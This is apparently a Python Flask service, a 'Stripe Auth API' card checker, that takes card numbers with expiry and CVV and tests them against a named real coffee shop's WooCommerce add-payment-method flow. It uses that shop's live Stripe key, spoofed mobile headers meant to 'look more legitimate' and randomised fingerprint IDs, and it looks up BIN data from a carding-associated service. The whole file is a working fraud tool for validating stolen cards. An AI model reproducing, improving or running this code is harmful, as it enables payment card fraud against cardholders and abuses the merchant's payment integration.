from flask import Flask, request, jsonify
import requests
import re
import random
import string
import time
import json

app = Flask(__name__)

def full_stripe_check(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Use mobile headers to look more legitimate
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://shop.wiseacrebrew.com',
        'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        print(f"Starting check for card: {cc[:6]}XXXXXX")
        
        # Step 1: Get the main account page to establish session
        account_url = 'https://shop.wiseacrebrew.com/account/'
        account_resp = session.get(account_url)
        
        # Step 2: Extract the nonce from add payment method page
        payment_url = 'https://shop.wiseacrebrew.com/account/add-payment-method/'
        payment_resp = session.get(payment_url)
        
        if payment_resp.status_code != 200:
            return {"status": "Declined", "response": "Failed to load payment page", "decline_type": "process_error"}

        # Look for the setup intent nonce
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', payment_resp.text)
        if not nonce_match:
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_resp.text)
        if not nonce_match:
            return {"status": "Declined", "response": "Could not find security nonce", "decline_type": "process_error"}
        
        nonce = nonce_match.group(1)
        print(f"Found nonce: {nonce}")

        # Step 3: Generate realistic Stripe parameters
        guid = ''.join(random.choices('0123456789abcdef', k=32)) + ''.join(random.choices('0123456789abcdef', k=16))
        muid = ''.join(random.choices('0123456789abcdef', k=32)) + ''.join(random.choices('0123456789abcdef', k=16))
        sid = ''.join(random.choices('0123456789abcdef', k=32)) + ''.join(random.choices('0123456789abcdef', k=16))
        
        # Step 4: Create Stripe payment method with proper formatting
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': '123 Main St',
            'billing_details[address][city]': 'New York',
            'billing_details[address][state]': 'NY',
            'billing_details[address][postal_code]': '10001',
            'billing_details[name]': 'Test User',
            'payment_user_agent': 'stripe.js/3ba51c7c33; stripe-js-v3/3ba51c7c33',
            'referrer': 'https://shop.wiseacrebrew.com',
            'time_on_page': str(random.randint(10000, 30000)),
            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy',
            'guid': guid,
            'muid': muid,
            'sid': sid,
        }
        
        print("Creating Stripe payment method...")
        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', 
                                 headers=stripe_headers, data=stripe_data)
        
        print(f"Stripe response status: {stripe_resp.status_code}")
        print(f"Stripe response: {stripe_resp.text[:200]}...")
        
        if stripe_resp.status_code != 200:
            error_data = stripe_resp.json()
            error_msg = error_data.get('error', {}).get('message', 'Stripe API error')
            return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
        
        stripe_data = stripe_resp.json()
        payment_token = stripe_data.get('id')
        
        if not payment_token:
            return {"status": "Declined", "response": "Failed to get payment token from Stripe", "decline_type": "process_error"}
        
        print(f"Got payment token: {payment_token}")
        
        # Step 5: Submit to website
        site_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        print("Submitting to website...")
        final_resp = session.post(
            'https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
            headers=site_headers,
            data=site_data
        )
        
        print(f"Final response status: {final_resp.status_code}")
        print(f"Final response: {final_resp.text}")
        
        final_data = final_resp.json()
        
        if final_data.get('success'):
            return {"status": "Approved", "response": "Payment method added successfully", "decline_type": "none"}
        else:
            error_msg = final_data.get('data', {}).get('error', {}).get('message', 'Declined by website')
            return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
            
    except Exception as e:
        print(f"Exception occurred: {str(e)}")
        return {"status": "Declined", "response": f"Processing error: {str(e)}", "decline_type": "process_error"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    
    # Validate card number
    if len(cc) != 16 or not cc.isdigit():
        return jsonify({"error": "Invalid card number"}), 400
        
    # Get BIN info first
    bin_info = get_bin_info(cc[:6])
    
    # Process the card check
    check_result = full_stripe_check(cc, mm, yy, cvv)

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'),
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'),
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

@app.route('/')
def home():
    return jsonify({"message": "Stripe Auth API is running!", "status": "active"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
